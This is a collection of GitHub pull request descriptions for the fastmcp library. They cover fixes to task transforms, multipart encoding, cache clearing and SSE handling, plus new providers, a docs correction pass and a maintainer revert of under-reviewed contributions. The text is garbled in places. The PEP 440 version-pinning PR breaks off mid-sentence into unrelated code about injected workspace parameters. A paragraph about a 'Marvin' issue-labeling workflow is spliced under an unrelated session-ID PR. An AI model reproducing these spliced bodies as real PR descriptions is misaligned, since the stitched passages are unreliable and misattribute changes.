title: Apply an AggregateProvider's own transforms to its task components
body:
## Description

Closes #6478

`AggregateProvider.get_tasks()` returned its children's task-eligible components without the aggregate's own transforms, so with `Namespace("math")` discovery dispatched `tool:math_square@` while Docket held `tool:square@`, and running the tool as a background task failed with `KeyError`. It now applies `_apply_task_transforms` and filters on `supports_tasks()`, as `LocalProvider` does since #5117.

`FastMCP` subclasses `AggregateProvider` and applied its transforms after `super().get_tasks()`, so that second pass is removed; keeping it would apply the transforms twice (an existing test caught `api_api_slow_thing`). Injected-tool handling is unchanged.

New tests cover the unchanged no-transform case, the aggregate's own transform, a child transform stacked under it, a catalog transform, and an end-to-end background task run. Three of them fail on `main`. `tests/tasks/server` and `tests/server/providers` pass; `tests/server/test_server.py` times out locally on unchanged `main` as well.

title: Send multipart object properties as JSON instead of a Python repr
body:
## Description

Closes #6455

A `multipart/form-data` object property fell through to `str()` in `RequestDirector`, so the backend received a Python repr (`{'title': 'a', 'note': None}`) instead of JSON. The OpenAPI Encoding Object defaults an object property to `contentType: application/json`, and `application/x-www-form-urlencoded` bodies already follow that (#5850).

The JSON-encoding decision is now a shared helper used by both form encodings, and multipart object properties are sent as JSON parts. Compatibility: scalars, string arrays and properties with another explicit `contentType` keep their current wire format (an existing test pins the explicit-encoding behaviour for string arrays, so I left it alone).

New tests cover object, nested object and `$ref` object properties plus unchanged scalars. The three object tests fail on `main`.

title: Report the inner session ID from a single-server MCPConfigTransport
body:
## Description

Closes #6476

`MCPConfigTransport` delegates `connect_session`, `close` and `legacy_only` to the underlying transport for a single-server config, but not `get_session_id()`, so it inherited the base implementation and always returned `None`. A multi-server config is an in-memory composite with no session of its own and still returns `None`.

Tests run the issue's reproduction against a real HTTP server and cover both config shapes. They fail on `main` and pass with this change.

Marvin now returns a structured list of labels. GitHub Actions validates the selection against its allowlist and existing repository labels, then applies the labels to the triggering issue or PR using a separate write token.

Duplicate auto-closure now checks the full comment and reaction history. After Marvin closes a duplicate, a new comment from the reporter, a repository contributor, or a maintainer reopens it for review if the current closure still belongs to Marvin.

```text
Marvin marks a duplicate → three days without a veto → Marvin closes it
```

title: Keep a config client's servers connected when another client closes
body:
## Description

Fixes #5824

Clients made with `Client.new()` share their `MCPConfigTransport`. In a multi-server config, each client's session opens its own backends and closes them when it exits. `MCPConfigTransport.close()` also closed the backends of whichever session connected last. So `close()` on any client sharing the transport, even one that never connected, cut off another client mid-session:

```python
clone = original.new()  # original = Client(multi_server_config)
async with clone:
    await original.close()  # original never connected
    await clone.call_tool("a_pid", {})  # ToolError: Error calling tool 'pid': Connection closed
```

`close()` now returns early while any session on the transport is still open, counted the way `StdioTransport` already counts `_active_sessions`. Each session still closes its own backends when it exits, and single-server configs are unchanged.

title: Map fractional integer bounds to exact int constraints in json_schema_to_type
body:
## Bug

`json_schema_to_type` passed fractional numeric bounds on `"type": "integer"` schemas straight to Pydantic as `ge`/`le`/`gt`/`lt`/`multiple_of` on `int`. Pydantic rejects non-integer values for these, so the validator fails to build with `SchemaError`. On the client, this makes `call_tool` return `data=None` for the whole result even when `structured_content` is valid.

## Change

When the base type is `int`, the constraints are rewritten to exact integer equivalents:

- `minimum` rounds up (`ceil`), `exclusiveMinimum` rounds down (`floor`), `maximum` rounds down, `exclusiveMaximum` rounds up.
- `multipleOf` uses the numerator of the value in lowest terms, read from its decimal string. `1.5` becomes `3`, `0.5` becomes `1`.

Integral bounds are unchanged.

## Testing

- `wsl -d Debian -- bash -lc 'cd /mnt/e/pr-go-state/work/PrefectHQ_fastmcp-6485-6324-cd1f90 && .venv/bin/python -m pytest tests/utilities/json_schema_type/test_constraints.py -k FractionalIntegerBounds -n 0 -q -p no:cacheprovider --tb=line'`: fails on the base commit with `'multiple_of' must be coercible to an integer` (6 failures), passes with the fix.
- `wsl -d Debian -- bash -lc 'cd /mnt/e/pr-go-state/work/PrefectHQ_fastmcp-6485-6324-cd1f90 && .venv/bin/python -m pytest tests/utilities/json_schema_type -n 0 -q -p no:cacheprovider 2>&1 | tail -n 15'`: 556 passed, 1 skipped.
- `wsl -d Debian -- bash -lc 'cd /mnt/e/pr-go-state/work/PrefectHQ_fastmcp-6485-6324-cd1f90 && .venv/bin/python -m pytest tests/utilities tests/client tests/tools -q -rfE -p no:cacheprovider > /tmp/wide.log 2>&1; echo EXIT $?; grep -E "^(FAILED|ERROR)|passed|failed" /tmp/wide.log | tail -n 20'`: 817 passed, 1 skipped, exit 0.

**Regression test:** fails on base twice (/must be coercible to an integer/), passes on fix twice (`.venv/bin/python -m pytest tests/utilities/json_schema_type/test_constraints.py -k FractionalIntegerBounds -n 0 -q -p no:cacheprovider --tb=line`)

Fixes #6485

title: Give triage's assess agent public facts about the people on an issue
body:
the assess agent never saw who it was assessing. intake collected each author's login and nothing else, and the prompt told the agent to "check unfamiliar contributors" with commands it has no credential to run. a maintainer skimming an issue sees in a second that the reporter has 3,000 followers, or that the PR author filed the issue an hour before their own fix and opens PRs across dozens of repos.

the assess context now carries a card for the issue author and each PR author, and the prompt is rewritten in plain terms to say how to use them.

```json
{"login": "67-luck", "account_created": "2025-09-13", "followers": 4,
 "prs_merged_here": 4, "prs_closed_unmerged_here": 6,
 "prs_elsewhere_last_6_months": 41, "repos_in_newest_100_of_those": 15}
```

<details>
<summary>notes</summary>

- each card is three GitHub searches plus a user lookup. a failed lookup (search is 30/min) leaves that card `unavailable` instead of failing the assessment.
- cards are dropped from the assessment cache fingerprint, so an unchanged issue keeps its cached assessment when follower counts drift.
- the cards stay in private run context; nothing about a contributor is published. that keeps the line #5284 drew.
- deploying needs the assess plan republished, since the objective changed.

</details>

title: fix(providers): apply AggregateProvider's own transforms in get_tasks
body:
## Description

`AggregateProvider.get_tasks()` returned its children's task components without its own transforms. With `aggregate.add_transform(Namespace("math"))`, tasks were registered with Docket as `tool:square@` while discovery dispatches `tool:math_square@`, so a background call failed with `KeyError`. #5117 fixed the same gap in `LocalProvider`; every other `get_tasks` already applies its own transforms.

- `AggregateProvider.get_tasks()` now runs the children's components through `_apply_task_transforms`, like `Provider.get_tasks()`. Gathering the children moves into `_get_child_tasks()`.
- `FastMCP` subclasses `AggregateProvider` and shares its `transforms` list, applying the server-level transforms in its own `get_tasks()`. It now takes `_get_child_tasks()` directly, so those transforms are applied once, not twice.

Tests: `TestAggregateProviderGetTasks` in `tests/server/providers/test_base_provider.py`:
- an aggregate's `Namespace("api")` registers `tool:api_my_tool@`, equal to `get_tool("api_my_tool").key`;
- a server-level `Namespace("srv")` over that aggregate gives `tool:srv_api_my_tool@`, which guards against double application.

Both fail on `main` (`tool:my_tool@` and `tool:srv_my_tool@`) and pass with the fix. `tests/server/providers`, `tests/server/mount`, `tests/server/transforms`, `tests/tasks` and `tests/server/test_server_docket.py`: 2287 passed.

Closes #6478

title: Add SkillManifestProvider to serve skills without loading their files
body:
To serve a skill today, you need a `Skill`, and a `Skill` holds every file's bytes in memory. If your skills live in a bucket or a database, you have to download all of them just to answer `skills/list`. But listing skills only needs each skill's frontmatter and each file's digest and size. The bytes only matter when a client reads a file.

This PR adds `SkillManifest`, which is a skill without its bytes, and `SkillManifestProvider`, which serves skills from manifests and fetches a file only when a client reads it:

```python
from fastmcp import FastMCP
from fastmcp.skills import SkillManifest
from fastmcp.skills.provider import SkillFileResource, SkillManifestProvider


class BucketSkills(SkillManifestProvider):
    async def load_manifests(self) -> dict[str, SkillManifest]:
        return await bucket.manifests()

    async def read_file(self, resource: SkillFileResource) -> bytes:
        return await bucket.read(resource.file.digest)


mcp = FastMCP("Skills", providers=[BucketSkills()])
```

`SkillCatalogProvider` is now a subclass that serves its manifests from memory, so both providers share one code path. As a side effect, the catalog no longer re-hashes every file on every request.

`SkillFileResource` and `SkillManifestResource` no longer hold a `Skill`. Both are new in the 4.2 alphas, so nothing stable breaks.

title: Fix KeyValueResponseCacheStore.clear() leaving entries past 10,000
body:
## Bug

`KeyValueResponseCacheStore.clear()` deletes the keys returned by a single `keys()` call. Backends return one page per call when no limit is given; the memory store caps that page at 10,000. With more entries than that in the adapter's collection, the remaining entries survive `clear()` and keep being served from the cache.

Reproduced: 10,050 entries, `clear()`, 50 remain.

## Change

`clear()` now loops on `keys()` and deletes each returned page until the collection is empty. The collection-scoping and the fallback paths are unchanged.

## Testing

- Added `test_clear_removes_more_than_one_page_of_keys`, which fills one collection with 10,050 entries and asserts it is empty after `clear()`. It fails before the change with `assert 50 == 0` and passes after it.
- `uv run pytest tests/client/client/test_kv_response_cache.py -n 0 -q -p no:cacheprovider`: 16 passed.
- `uv run prek run --files fastmcp_slim/fastmcp/client/caching.py tests/client/client/test_kv_response_cache.py`: exit 0.

**Regression test:** fails on base twice (/assert \d+ == 0/), passes on fix twice (`uv run pytest tests/client/client/test_kv_response_cache.py -n 0 -k test_clear_removes_more_than_one_page_of_keys`)

Fixes #6441

title: fix(openapi): allow re-entering OpenAPIProvider lifespan when client is auto-created (#5844)
body:
Fixes #5844

### Root Cause
When `OpenAPIProvider` is initialized without an explicit `client=` (including via `FastMCP.from_openapi`), `self._owns_client` is `True` and a default `httpx2.AsyncClient` is created in `__init__`. Previously, `OpenAPIProvider.lifespan()` ran `async with self._client:`, which closed `self._client` on the first lifespan exit. A subsequent lifespan entry attempted to re-enter the closed `httpx2.AsyncClient`, raising:

```
RuntimeError: Client failed to connect: Cannot reopen a client instance, once it has been closed.
```

Concurrent lifespan entries on a shared `OpenAPIProvider` could also attempt to enter `self._client` more than once or close it while another lifespan was still active.

### Fix
In `fastmcp_slim/fastmcp/server/providers/openapi/provider.py`:
1. Store `self._openapi_spec` along with a reference counter (`self._client_ref_count`) and an `asyncio.Lock` (`self._client_lock`) when managing an auto-created client.
2. In `lifespan()`, when `self._owns_client` is `True`:
   - If `self._client.is_closed`, recreate a fresh default client via `self._create_default_client(self._openapi_spec)` and propagate it to `self._client` and all registered `_tools`, `_resources`, and `_templates` via `_update_components_client()`.
   - Reference-count `__aenter__` / `__aexit__` under `self._client_lock` so the underlying client is opened once on first entry and closed only when the final active lifespan exits.
3. Add regression tests in `tests/server/providers/openapi/test_server.py` (`TestOpenAPIProviderLifespanReuse`) covering:
   - Reconnecting `FastMCP.from_openapi` without an explicit client and executing tools on both connections.
   - Concurrent/nested `lifespan()` calls sharing the open client safely and recreating a fresh one afterward.
   - Leaving explicitly provided `client=` instances unmanaged and unclosed.

### Verification
- Red before: `test_from_openapi_without_explicit_client_reconnects` failed on the second connection with `RuntimeError: Client failed to connect: Cannot reopen a client instance, once it has been closed.` and `test_concurrent_lifespans_share_and_close_client_safely` failed with `RuntimeError: Cannot open a client instance more than once.`
- Green after:
  - `uv run pytest tests/server/providers/openapi/test_server.py -k "TestOpenAPIProviderLifespanReuse" -v` -> 3 passed
  - `uv run pytest tests/server/providers/openapi/ tests/client/test_openapi.py -q` -> 608 passed
  - `uv run ruff check` & `uv run ruff format --check` -> clean
  - `uv run ty check` -> clean

title: fix(openapi): enforce nested input schemas under strict validation
body:
`strict_input_validation` checked only the top-level argument key set (#6140), so violations *inside* the advertised schema — wrong types, extra keys under `additionalProperties: false`, missing nested required properties — reached the HTTP transport verbatim. A client calling a tool built from an OpenAPI spec with `strict_input_validation=True` could still send `{"options": {"level": "one", "extra": 1}}` upstream even though the tool's schema demands an integer `level` and forbids extra keys.

Under strict validation, each body argument is now validated against its advertised property schema with `Draft202012Validator`, so the call is rejected before dispatch. This reuses the same validator and root-document `$defs` resolution pattern the director already applies for its null-representation check, so nested schemas behind `$ref` resolve correctly:

```python
# advertised schema: options.level is an integer, additionalProperties: false
await client.call_tool("submit", {"options": {"level": "one", "extra": 1}})
# ToolError: Argument 'options' does not match its schema:
#   $.level: 'one' is not of type 'integer'; $.extra: Additional properties are not allowed
```

Lax mode is unchanged: arguments still flow to the transport verbatim, and valid nested bodies dispatch exactly as before.

Fixes #6457

Verified the new tests in `tests/server/providers/openapi/test_strict_nested_schemas.py` fail on unchanged `main` and pass with this change, alongside the existing OpenAPI provider and strict-validation suites.

title: Send multipart object properties as JSON parts
body:
## Description

Closes #6455

A tool built from a `multipart/form-data` request body sent an object property as the Python `repr` of the dict (`{'title': 'a', 'x': None}`), which a backend cannot parse as JSON. The OpenAPI Encoding Object defaults an object property to `contentType: application/json`, and urlencoded bodies already follow it (#5851).

The multipart branch of `RequestDirector.build` now sends a dict, or a non-empty list of dicts, as one JSON part (`json.dumps(..., allow_nan=False)`) with `Content-Type: application/json`, or the JSON `contentType` the property's `encoding` declares. An `encoding` whose `contentType` is not JSON keeps the old serialization. Scalars, string arrays, files, and other arrays are unchanged. The multipart section of `docs/integrations/openapi.mdx` documents it.

`test_multipart_arrays_preserve_other_parts[object]` pinned the dict `repr` as the expected output while checking that other parts survive, so its expectation is now the JSON text.

The new tests parse the multipart body and check each part's content type and payload. Five of them fail on `main` and pass with the change.

title: Keep completion from suggesting values for hidden references
body:
`completion/complete` ran the server's completion handler for any reference, so a prompt or resource template hidden by `disable()`, a visibility transform, its own `auth`, or `AuthMiddleware` still returned suggestions. completion for those references now answers like an unknown reference: an empty completion. resolves #5236. ```python mcp = FastMCP(middleware=[AuthMiddleware(auth=lambda ctx: False)]) @mcp.resource("notes://{path}") def note(path: str) -> str: ... @mcp.completion def complete(ref, argument, context): return ["private/salary.md"] await client.complete(ResourceTemplateReference(uri="notes://{path}"), ...) # before: ['private/salary.md'] after: [] ```
design notes the server resolves the reference with `get_prompt` / `get_resource_template`, which apply visibility, session transforms and component `auth` without re-running middleware, so a completion stays one request to rate limits and caches. `AuthMiddleware` gates `completion/complete` in its own `on_request` against the resolved component; when it denies, it keeps the server's era-specific result envelope and empties the values, so the handler still runs but its suggestions never leave the server. a resource reference must name a listed template; completion is defined for template parameters. supersedes #5249 for this fix, without the new middleware hook.

title: Support shared server lifespans across authenticated HTTP apps
body:
Serving one FastMCP server under several public hostnames requires separate authentication providers, but `http_app()` always uses the server's provider and explicit shared resource ownership currently requires a private method. This adds `http_app(auth=...)` and a public `lifespan_context()` so applications can choose their own authentication while sharing one server startup and shutdown.

Omitting `auth` preserves the server's configuration; explicitly passing `None` disables authentication only for that app. The outer `lifespan_context()` must start before every app lifespan and remain open until they all stop. Single-app behavior is unchanged. This is explicit ownership, not a change to the independently overlapping lifespans or concurrent cold-start behavior tracked in #5515.

Save this as `app.py`, configure the identity-provider URLs and audiences for your deployment, and serve it with `uvicorn app:app`:

```python
from contextlib import AsyncExitStack, asynccontextmanager

from pydantic import AnyHttpUrl
from starlette.applications import Starlette
from starlette.routing import Host

from fastmcp import FastMCP
from fastmcp.server.auth import RemoteAuthProvider
from fastmcp.server.auth.providers.jwt import JWTVerifier

server = FastMCP("Shared Server")
apps = {}
for host in ("old.example.com", "new.example.com"):
    verifier = JWTVerifier(
        jwks_uri="https://identity.example.com/.well-known/jwks.json",
        issuer="https://identity.example.com/",
        audience=f"https://{host}/mcp",
    )
    auth = RemoteAuthProvider(
        token_verifier=verifier,
        authorization_servers=[AnyHttpUrl("https://identity.example.com")],
        base_url=f"https://{host}",
    )
    apps[host] = server.http_app(auth=auth)


@asynccontextmanager
async def lifespan(app: Starlette):
    async with server.lifespan_context(), AsyncExitStack() as stack:
        for http_app in apps.values():
            await stack.enter_async_context(http_app.lifespan(http_app))
        yield


app = Starlette(
    routes=[Host(host, app=http_app) for host, http_app in apps.items()],
    lifespan=lifespan,
)
```

Fixes #5648.

AI-assisted implementation using OpenAI Codex.

title: fix(client): clear every key in KeyValueResponseCacheStore
body:
## Description

`KeyValueResponseCacheStore.clear()` deleted the keys from a single `keys()` call, but py-key-value backends return at most one page per call (10,000 keys for the memory and Redis stores). Anything past the first page survived `clear()` and kept being served from the cache.

`clear()` now keeps listing and deleting until the collection is empty, using `delete_many` for each page. It stops if a page deletes nothing, so a backend that keeps listing keys it can't delete doesn't make `clear()` hang, and after at most 1,000 pages, so clients that keep writing to a shared collection can't keep it running. Backends without key enumeration still go through `destroy_collection` as before.

```python
store = KeyValueResponseCacheStore(storage=MemoryStore())
# ... 10,050 entries set ...
await store.clear()
# before: 50 entries still served; now: 0
```

On Redis this is a partial fix. py-key-value's `RedisStore.keys()` runs a single `SCAN` from cursor 0 and drops the returned cursor, so it can return an empty page while entries remain, either once earlier keys have been deleted or when the database also holds other keys. Against Redis 7, `clear()` now empties a dedicated database of 50,000 entries (40,000 survived before), but about 24,000 of 100,000 still survive (90,000 before), and with 30,000 unrelated keys in the database about 8,000 of 12,000 survive (about 9,000 before). Clearing the rest needs `keys()` to follow the cursor, which I reported upstream: strawgate/py-key-value#400.

Closes #6441

title: fix(client): compare pinned tool versions against the listed version PEP 440-normalized
body:
### All Submissions:

- [x] Have you followed the guidelines stated in [CONTRIBUTING.md](https://github.com/PrefectHQ/fastmcp/blob/main/CONTRIBUTING.md)?

`Client.call_tool(name, version=...)` compares the pinned version against the version listed on the wire with plain string equality, while the server resolves version specs with PEP 440 normalization and v-prefix insensitivity.     return workspace or "default"


```python
@mcp.tool
async def list_items(resolved: str = Depends(current_workspace)) -> str:
    return resolved  # schema: optional `workspace`; list_items never receives it
```

the lifting itself lives in uncalled-for (chrisguidry/uncalled-for#29), which owns the dependency graph; `without_injected_parameters` adds the parameters it reports. this raises the `uncalled-for` floor to 0.6.1, which ships it.

title: Revert 12 contributions merged without enough review
body:
reverts 12 community PRs that an automated backlog sweep merged today. a maintainer review found them not worth carrying: a new provider merged as a fix (#6264), a reversal of a deliberate design (#5062), and fixes for hypothetical problems or ones far larger than the problem. none of them reached a release. the full suite passes with them reverted.

<details>
<summary>why each one</summary>

- #6264: A new feature merged as a fix: it adds a KeystoneTokenVerifier provider, a keystone extra, the keystoneauth1 dependency (also pulled into the dev group) and a docs page. The maintainers never agreed to carry an OpenStack provider.
- #5588: #6180 already fixed the ~1/~0 and sub-pointer cases. What this adds on main only decodes %24defs and %2F in the '#' prefix, which no generator emits. The pointer edge case is invented and comes with ~90 lines of tests.
- #5731: Self-reported and niche: a regex Pydantic can't compile plus a format that maps to a non-str type. It only restores an informational x-unsupported-pattern marker nobody reads, and adds a cached helper for it.
- #6041: The author filed the issue for their own PR. Sibling constraints beside a scalar $ref in an output schema are hypothetical. It adds 60 lines to the client's result.data hydration: a $schema draft sniff, a keyword whitelist, ref-chain chasing and a BeforeValidator.
- #5062: Unconditional UI advertisement was deliberate (main's comment said so) and no host was reported to break. Adds may_serve_apps to Provider plus 4 overrides (+357), and apps registered after init go unadvertised, so docs now tell users to add the extension manually.
- #5798: Invented, self-filed scenario: catch the ValueError from task=True on a sync fn, then register the same fn on another server. Nobody does this; they fix the function. Adds a sentinel plus try/except rollback and 4 tests for it.
- #6045: Invented consistency issue: nobody hit a failure, and the spec only says SHOULD. It makes unpaginated servers reject cursors they used to tolerate, which was load-bearing (8 cycle tests broke), and rewrote ~250 lines of client tests to fit.
- #6107: Speculative hardening. Pydantic version URLs are not a vulnerability, and the echoed inputs belong to the caller. It changes the error text every client/LLM sees for every tool and adds a custom formatter to maintain.
- #5543: An agent invented this race: two explicit list_tools() calls overlapping while the server changes in between, and it heals on the next refresh. Fixing it adds a second lock beside _route_lock and serializes every group list_tools call. The cost is permanent, for a scenario no user has hit.
- #5836: Agent-filed issue (BlueX888, who also co-wrote the PR) with no user report. Adds a 45-line helper that redoes pydantic alias resolution with signature+get_type_hints on every render, plus a separate test file. #6054 fixed the same issue for resource templates in one line.
- #6147: Leak is real, but it adds an 82-line cache that writes __fastmcp_callable_cache__ onto user functions/instances, with pickling hooks. uncalled-for still leaks. Fix belongs on FunctionTool: build wrappers per tool, drop global lru_caches.
- #5507: The PR author also filed the issue: remove a tool while its task is in TTL, then poll. That is an invented edge case. The fix changes the persisted Docket result format for every tool task to a magic-key envelope, adds a legacy branch in tasks_get and roughly 70 lines of wrapper code.

</details>

title: Stop the SSE endpoint sending a second response after its stream
body:
an SSE app behind any `BaseHTTPMiddleware` logged `AssertionError: Unexpected message: {'type': 'http.response.start', ...}` every time a client disconnected. the unauthenticated `/sse` route was a request/response endpoint, so once `connect_sse` had streamed the whole response, Starlette sent the trailing empty `Response()` as a second `http.response.start`. the authenticated route already wrapped the handler in an ASGI class and threw that return value away.

the SSE handler is now a plain ASGI app on both routes, so it sends one response and the trailing `Response()` is gone.

```python
app = mcp.http_app(transport="sse", middleware=[Middleware(PassthroughMiddleware)])
# before: tool calls work, but every disconnect logs "Exception in ASGI application"
# after: disconnects close cleanly
```

Fixes #858

title: Make background task execution TTL configurable
body:
background task results were always dropped after docket's default of 15 minutes. `TasksExtension` exposed the other docket settings through `FASTMCP_DOCKET_*` but not the execution TTL, so a server running hour-long tasks had no supported way to keep results around until clients picked them up. `FASTMCP_DOCKET_EXECUTION_TTL` was silently ignored.

`DocketSettings` now has an `execution_ttl` setting (default 15m, the same as before), `TasksExtension` takes a matching kwarg, and the lifespan passes it to `Docket(...)`. `ttlMs` and the snapshot TTL already read `docket.execution_ttl`, so clients see the new value without any other change.

```python
mcp.add_extension(TasksExtension(execution_ttl=timedelta(hours=2)))
# or FASTMCP_DOCKET_EXECUTION_TTL=PT2H
```

The request in the issue comments for a separate, shorter TTL on token snapshots is a different design question, and this PR doesn't address it.

Closes #3802

title: Reconnect StdioTransport when reused on a different event loop
body:
a kept-alive stdio session belongs to the event loop that created it. reusing the same `Client` from a second loop handed that loop the first loop's session. its responses never arrived, so `async with client` hung forever, and `init_timeout` didn't bound it.

`StdioTransport.connect` now notices when the live connection belongs to another loop. if that connection is idle, it tears it down on its owning loop, waits for the teardown to finish, then reconnects on the current loop. if another loop is still using the connection, it raises a `RuntimeError` before waiting on the loop-bound connect lock. a closed owning loop has already cancelled its task, so nothing is left to stop.

```python
client = Client(StdioTransport("python", ["server.py"]))  # keep_alive=True
asyncio.run_coroutine_threadsafe(use(client), loop_a).result()
asyncio.run(use(client))  # hung before; now spawns a fresh subprocess on this loop
```

this builds on David's #4697 and addresses the two Codex threads there: the loop-bound lock, and the foreign-loop disconnect that returned before teardown finished.

Fixes #4471

title: Apply logging/setLevel to mounted servers over HTTP sessions
body:
A handshake-era client that sent `logging/setLevel` over a stateful HTTP session still got sub-threshold `ctx.log()` messages from tools on mounted servers. The parent handled the request and saved the level in its own `_client_log_levels` dict, keyed by session id. The mounted tool's `Context` checked the child server's dict, which was empty. In-memory and stdio connections already worked because #5899 stores their level in `Connection.state`.

This change stores the level in `Connection.state` on every transport and removes the server-side dict. Every server that handles the connection's requests now reads the same value, and the level is released when the connection ends, so the explicit cleanup from #5539 is no longer needed.

```python
parent = FastMCP("parent")
parent.mount(child)  # child tool logs at info and at error

async with asgi_client(parent, mode="legacy", log_handler=on_log) as client:
    await client.set_logging_level("warning")
    await client.call_tool("say")
# before: ['info', 'error']   after: ['error']
```

title: Call a re-versioned tool by its transformed version
body:
`ToolTransformConfig(version="2.0")` lists a tool under 2.0, but `call_tool(..., version="2.0")` failed with `Unknown tool`. The original version, which is no longer listed, still worked. `ToolTransform.get_tool` sent the caller's version spec unchanged to the source lookup, so the spec was checked against the source version and not the one the tool is listed under.

When the config sets a version, `get_tool` now checks the request against that version and rejects the original one. A source whose own version also matches the request still takes priority, so explicit calls keep resolving to the same source when several source versions are collapsed into one public version. Otherwise the source is looked up the same way as a call that gives no version.

```python
mcp.add_transform(ToolTransform({"calc": ToolTransformConfig(version="2.0")}))
await client.call_tool("calc", {"x": 1}, version="2.0")  # before: Unknown tool; now: 1
await client.call_tool("calc", {"x": 1}, version="1.0")  # before: 1; now: Unknown tool
```

The tests build on the reporter's closed #6358.

title: docs: correct the apps pages against main
body:
the apps docs had drifted from the code on main: wrong parameters and defaults, behavior claims the code doesn't match, and examples that didn't run. each change was checked against the source, then a second pass tried to refute every edit and reverted or corrected the ones that didn't hold. `tests/docs` and `mint broken-links` pass.

<details>
<summary>changes by page</summary>

- `docs/apps/architecture.mdx`: PrefabApp.to_json() output was listed as view/state/_meta. Prefab actually emits $prefab, view and optional state/defs/theme keys, and FastMCP adds _meta. Fixed. Said the tool resolver runs only on function references and handles unwrap_result. It runs on every CallTool, and FastMCP never sets unwrap_result. Corrected and removed the unwrap claim. Hashed-references section narrated history ('still', 'no longer'). Rewrote it to state the hash: the first 12 hex characters of a SHA-256 over app name and tool name. Said the hashed name reaches the renderer and the host forwards it. That contradicted late-bound naming: servers rewrite references to listed names on the way out. Fixed both places and linked the anchors. Hashed lookup fallback: added that only tools whose visibility includes "app" answer to a hashed name. This matches is_app_tool_with_identity. Said App is 'sometimes called AppBridge'. In ext-apps, App runs in the iframe and AppBridge runs in the host. Corrected. Dev server: CORS is avoided because the host page's MCP client calls /mcp on its own origin, not the renderer iframe. Launch flow: the new tab calls the tool after the renderer initializes, not before the tab opens. F... Added the text language to two code fences that had none: the pipeline diagram and the ambiguity error message.
- `docs/apps/development.mdx`: Same two dev-server fixes: the new tab calls the tool and renders the result, and the proxy keeps the dev UI's MCP client same-origin.
- `docs/apps/examples.mdx`: Replaced the empty alt attributes on all nine tile screenshots with alt text describing each picture, checked against the images.
- `docs/apps/fastmcp-app.mdx`: The mount example used `platform.mount("contacts", contacts_server)`, which is not the current signature. Changed it to `platform.mount(contacts_server, namespace="contacts")`. The page said only function references are composition-safe and that `CallTool("save_contact")` breaks when mounted. Inside a FastMCPApp, string names resolve too (verified: both become `contacts_save_contact`). Rewro... The `@app.ui()` option list was missing `annotations` and claimed parity with `@mcp.tool`. Replaced it with the real keyword list.
- `docs/apps/generative.mdx`: The page said Deno 'installs automatically on first use'. The sandbox actually requires Deno on PATH and fails without it. Corrected this and noted that Pyodide itself downloads on first use. The search_prefab_components output example was stale (7 matches and an old format). Updated it to the current output, gave the fence a `text` language, and described the automatic detail behavior (≤5 matches) and the...
- `docs/apps/prefab.mdx`: Added the missing prefab_ui imports to the bar chart, pie chart, dashboard, reactive, CSP and ToolResult examples. I ran the chart, dashboard and reactive tools against a client and they work. Fixed a dashboard metric...
- `docs/apps/providers/approval.mdx`: Said the LLM can override every constructor option per call, but `name` can't be overridden. Fixed that claim and added the missing import to the constructor block. The per-call example was written as a Python call to `request_approval(...)`, which isn't defined anywhere the reader can run. Replaced it with a JSON block of the tool arguments the LLM sends.
- `docs/apps/providers/choice.mdx`: Added the missing `Choice` import to the constructor block. Replaced the Python `choose(...)` call, which can't run, with a JSON block of the tool arguments.
- `docs/apps/providers/file-upload.mdx`: The stateless-HTTP warning said every deployment must override `_get_scope_key`. On 2026-07-28 connections the default already scopes by authenticated user, so the warning now covers only handshake-era clients. Reword... The S3 example used an undefined `s3`. Added `import boto3` and an `s3` client. Added the missing `FileUpload` import to the SharedUpload example.
- `docs/apps/providers/form.mdx`: Documented the per-call `title`, `submit_text` and `default` arguments of `collect_*`, which weren't on the page. `default` pre-fills the form and needs prefab-ui>=0.19.1. The page said that without `send_message` the result is 'just the tool return value'. The result actually goes only to the form UI, and the LLM never sees the submission. Fixed, and said that the callback's string bec... Made the callback and multiple-forms examples self-contained. They had an undefined `db`, undefined models and missing imports. Ran the multiple-forms code: it registers as described. tests/docs passes (67 passed).

</details>

title: fix(auth): keep revocation ownership separate from user identity
body:
OAuth proxy access tokens carry the upstream verifier's identity, while the SDK revocation handler checks ownership against the downstream OAuth client. That mismatch makes an owner's access-token revocation a silent no-op. Substituting the downstream client during ordinary verification would instead collapse users who share one client, as identified in #5807.

Use a revocation-only provider adapter to copy the verified downstream client identity at that ownership boundary. Alice and Bob keep their distinct upstream identities during authenticated requests, and the owning client can forward revocation of the correct upstream access token. The SDK still builds the route and retains its request-size limit and CORS behavior. Refresh-token and ID-JAG handling remain intact. This fixes ownership and forwarding; immediate invalidation still depends on the upstream verifier's revocation semantics.

Fixes #5800. Builds on #5807 by @67-luck and the report by @BlueX888.

title: Fix generate-cli type labels for optional and union parameters
body:
Pydantic writes `int | None`, `str | int` and `list[int] | None` as an `anyOf` with no top-level `type`. The generated `list-tools` command and the SKILL.md table only looked at `type`, so all of these came out as `string`, and SKILL.md told agents an `int | None` flag takes a string.

Both now build the label from the `anyOf` or `oneOf` branches, joined with ` | ` the way SKILL.md already shows a `type` list. Anything with its own `type` is unchanged, and the rest still falls back to `string`. The generated script gets its own small copy of the helper since it runs standalone. `list-tools` also stops printing a `type` list as a Python list, so `['integer', 'null']` shows as `integer | null`.

```bash
python cli.py list-tools
# before: search(query: string, count: integer, key: string, limit: string = ..., ids: string = ...)
# after:  search(query: string, count: integer, key: string | integer, limit: integer | null = ..., ids: array | null = ...)
```

#6106 also touches `_schema_type_label`. Both give `string | null` for `str | None`, but its SKILL.md test expects `string` for an `int | None` flag, so whichever lands second needs a small conflict fix and that one assertion updated.

Fixes #6402

title: fix(types): preserve keyword-only defaults in create_function_without_params (#6400)
body:
## Description

When `create_function_without_params` clones a callable, it reconstructs the function object using `types.FunctionType(code, globals_dict, name, defaults, closure)`. In Python, the constructor's `defaults` argument only applies to positional parameters (`__defaults__`), leaving `__kwdefaults__` unset (`None`). As a result, invoking the clone without passing optional keyword-only arguments raises a `TypeError`.

This change copies `__kwdefaults__` from the source function (or underlying method function) onto the cloned function so that retained keyword-only parameters maintain their default values when called:

```python
if kwdefaults is not None:
    new_func.__kwdefaults__ = dict(kwdefaults)
```

Closes #6400

title: fix: support calling tools re-versioned via ToolTransformConfig (#6357)
body:
### Description

When a tool is re-versioned using `ToolTransformConfig(version="2.0")`, `list_tools` properly advertises the tool under the new version. However, calling `client.call_tool("name", ..., version="2.0")` previously failed with `Unknown tool: 'name'`. Conversely, calling the tool with its old version (e.g. `1.0`) succeeded even though that version was no longer advertised.

### Root Cause

In `ToolTransform.get_tool`:
1. `call_next(original_name, version=version)` forwarded the requested `version` directly to the underlying provider. If the tool was originally registered under version `1.0` and the caller requested the advertised version `2.0`, `call_next` failed to find a matching tool in the underlying provider, returning `None`.
